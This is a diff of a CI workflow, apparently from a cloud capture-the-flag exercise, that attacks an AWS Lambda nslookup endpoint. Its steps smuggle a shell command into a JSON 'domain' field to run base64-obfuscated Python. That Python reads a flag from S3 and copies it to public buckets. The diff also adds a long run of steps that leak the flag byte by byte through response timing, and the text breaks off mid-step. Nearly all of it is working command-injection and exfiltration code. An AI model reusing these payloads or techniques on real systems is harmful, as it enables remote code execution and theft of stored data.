@@ -23,12 +23,8 @@ jobs:
       - name: Who am I
         run: aws sts get-caller-identity
 
-      - name: List platform-bucket for any exfil results
-        run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
-
-      - name: EXPLOIT - boto3 read + try all write paths (3-valued timing in Python)
+      - name: EXPLOIT - boto3 write flag to platform-bucket (15s = success)
         run: |
-          # ~1s = boto3 read FAILED, ~8s = read OK but write blocked, ~15s = SUCCESS
           B64="aW1wb3J0IGJvdG8zLHN1YnByb2Nlc3Msb3Msc3lzLHRpbWUKcz1ib3RvMy5jbGllbnQoJ3MzJykKc3VjY2Vzcz1GYWxzZQojIFRlc3QgMTogYm90bzMgcmVhZCBmcm9tIGNvZGVjIGJ1Y2tldAp0cnk6CiAgICBmbGFnPXMuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgICMgUmVhZCBzdWNjZWVkZWQhIFRyeSBtdWx0aXBsZSB3cml0ZSBwYXRocwogICAgIyBXcml0ZSBwYXRoIDE6IGJvdG8zIFBVVCB0byBwbGF0Zm9ybS1idWNrZXQKICAgIHRyeToKICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdwbGF0Zm9ybS1idWNrZXQtMDA5NjYxNzY0MDc3LXVzLWVhc3QtMScsS2V5PSdmbGFnLWJvdG8zLnR4dCcsQm9keT1mbGFnKQogICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgICMgV3JpdGUgcGF0aCAyOiBib3RvMyBQVVQgdG8gY29kZWMgYnVja2V0IChkaWZmZXJlbnQga2V5LCBtYXliZSBsYW1iZGFSb2xlIGhhcyBQdXRPYmplY3QgaW4gSUFNKQogICAgaWYgbm90IHN1Y2Nlc3M6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzLnB1dF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLWV4ZmlsLnR4dCcsQm9keT1mbGFnLEFDTD0ncHVibGljLXJlYWQnKQogICAgICAgICAgICBzdWNjZXNzPVRydWUKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIGlmIHN1Y2Nlc3M6CiAgICAgICAgdGltZS5zbGVlcCgxMykgICMgU1VDQ0VTUzogcmVhZCArIHdyaXRlIHdvcmtlZCAtPiB+MTVzIHRvdGFsCiAgICBlbHNlOgogICAgICAgIHRpbWUuc2xlZXAoNikgICAjIFJFQUQgT0sgYnV0IG5vIHdyaXRlIHBhdGggd29ya2VkIC0+IH44cyB0b3RhbApleGNlcHQ6CiAgICBwYXNzICAjIFJFQUQgRkFJTEVEOiBubyBleHRyYSBzbGVlcCAtPiB+MS0ycyB0b3RhbAojIFRlc3QgMjogZmluZCBhd3MgYmluYXJ5IGFuZCB0cnkgYXdzIHMzIGNwIChpbiBjYXNlIHRoZSBhYm92ZSBmYWlsZWQpCmlmIG5vdCBzdWNjZXNzOgogICAgZm91bmQ9Tm9uZQogICAgZm9yIHAgaW4gWycvb3B0L2Jpbi9hd3MnLCcvb3B0L2F3cycsJy91c3IvbG9jYWwvYmluL2F3cycsJy91c3IvYmluL2F3cyddOgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHApOgogICAgICAgICAgICBmb3VuZD1wCiAgICAgICAgICAgIGJyZWFrCiAgICBpZiBub3QgZm91bmQ6CiAgICAgICAgcj1zdWJwcm9jZXNzLnJ1bihbJ3doaWNoJywnYXdzJ10sY2FwdHVyZV9vdXRwdXQ9VHJ1ZSx0ZXh0PVRydWUpCiAgICAgICAgaWYgci5yZXR1cm5jb2RlPT0wOgogICAgICAgICAgICBmb3VuZD1yLnN0ZG91dC5zdHJpcCgpCiAgICBpZiBmb3VuZDoKICAgICAgICBmb3IgZGVzdCBpbiBbJ3MzOi8vcGxhdGZvcm0tYnVja2V0LTAwOTY2MTc2NDA3Ny11cy1lYXN0LTEvZmxhZy1yY2UudHh0JywnczM6Ly9jb2RlYzRmMjZjODYyYTMyMWVmNS9mbGFnLWV4ZmlsMi50eHQnXToKICAgICAgICAgICAgb3V0PXN1YnByb2Nlc3MucnVuKFtmb3VuZCwnczMnLCdjcCcsJ3MzOi8vY29kZWM0ZjI2Yzg2MmEzMjFlZjUvZmxhZy50eHQnLGRlc3RdLGNhcHR1cmVfb3V0cHV0PVRydWUsdGV4dD1UcnVlKQogICAgICAgICAgICBpZiBvdXQucmV0dXJuY29kZT09MDoKICAgICAgICAgICAgICAgIHN1Y2Nlc3M9VHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiBzdWNjZXNzOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEzKQ=="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
@@ -36,28 +32,24 @@ jobs:
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          echo "Timing: ${ELAPSED_MS}ms"
-          if [ $ELAPSED_MS -gt 12000 ]; then
-            echo "SUCCESS! Flag exfiltrated"
-            sleep 3
-            echo "--- flag-boto3.txt (platform-bucket public) ---"
-            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-boto3.txt
-            echo
-            echo "--- flag-rce.txt (platform-bucket public) ---"
-            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-rce.txt
-          elif [ $ELAPSED_MS -gt 4000 ]; then
-            echo "S3 READ works but all write paths blocked"
-            echo "=> lambdaRole has no PutObject on any writable bucket"
-            echo "=> Next: use nibble timing to extract flag byte by byte"
-          else
-            echo "S3 READ FAILED via boto3 (~1s)"
-            echo "=> lambdaRole IAM has no s3:GetObject, OR no S3 VPC endpoint, OR something else"
-          fi
+          echo "Exploit timing: $(( (END - START) / 1000000 ))ms"
 
-      - name: NIBBLE EXFIL byte 0 hi (only meaningful if previous step showed ~8s)
+      - name: Read flag via cicdRole (bucket policy Principal='*' allows same-account auth access)
         run: |
-          # Encodes high nibble of flag[0] as sleep duration: sleep = nibble + 2 sec
+          echo "=== List platform-bucket ==="
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
+          echo
+          echo "=== GetObject flag-boto3.txt as cicdRole (same-acct bucket policy grant) ==="
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag-boto3.txt - 2>&1
+          echo
+          echo "=== s3api GetObject ==="
+          aws s3api get-object --bucket platform-bucket-009661764077-us-east-1 --key flag-boto3.txt /dev/stdout 2>&1
+          echo
+          echo "=== List codec bucket ==="
+          aws s3 ls s3://codec4f26c862a321ef5/ 2>&1 || echo "(denied)"
+
+      - name: NIBBLE EXFIL byte[0] hi-nibble (fallback if S3 GET above failed)
+        run: |
           B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
           INJECT="x; echo $B64 | base64 -d | python3 #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
@@ -65,11 +57,10 @@ jobs:
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
-          echo "Byte 0 HIGH nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE (char hi-bits = $(( NIBBLE << 4 )))"
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[0] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
 
-      - name: NIBBLE EXFIL byte 0 lo
+      - name: NIBBLE EXFIL byte[0] lo-nibble
         run: |
           B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
           INJECT="x; echo $B64 | base64 -d | python3 #"
@@ -78,7 +69,365 @@ jobs:
           curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" -d @payload.json
           END=$(date +%s%N)
-          ELAPSED_MS=$(( (END - START) / 1000000 ))
-          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
-          echo "Byte 0 LOW nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE"
-          echo "=> byte[0] = (hi<<4)|lo = char"
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[0] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[1] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[1] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[1] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[1] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[2] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[2] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[2] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMl0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[2] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[3] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[3] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[3] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbM10mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[3] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[4] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[4] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[4] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[4] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[5] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[5] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[5] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[5] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[6] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[6] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[6] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbNl0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[6] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[7] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[7] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[7] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbN10mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[7] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[8] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[8] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[8] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[8] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[9] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[9] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[9] lo-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbOV0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[9] LO: ${MS}ms => nibble=$((MS/1000-2))"
+
+      - name: NIBBLE EXFIL byte[10] hi-nibble
+        run: |
+          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMTBdPj40KSsyKQpleGNlcHQ6CiAgICBwYXNz"
+          INJECT="x; echo $B64 | base64 -d | python3 #"
+          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+            -H "Content-Type: application/json" -d @payload.json
+          END=$(date +%s%N)
+          MS=$(( (END - START) / 1000000 ))
+          echo "byte[10] HI: ${MS}ms => nibble=$((MS/1000-2)) => hi_bits=$(( (MS/1000-2) << 4 ))"
+
+      - name: NIBBLE EXFIL byte[10] lo-nibble
+        run: |
